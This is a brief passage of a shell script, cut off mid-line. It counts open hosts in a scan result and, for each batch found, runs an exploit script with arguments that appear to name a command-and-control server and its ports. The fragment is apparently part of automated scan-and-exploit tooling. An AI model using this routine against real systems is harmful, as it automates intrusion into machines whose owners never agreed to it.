              COUNT=$(grep -c "Host:" "/tmp/scan_${S}.txt" 2>/dev/null || echo 0)
              echo "  Open hosts: $COUNT"

              if [ "$COUNT" -gt 0 ]; then
                python3 /tmp/exploit.py "$C2" "$CPORT" "$PPORT" \
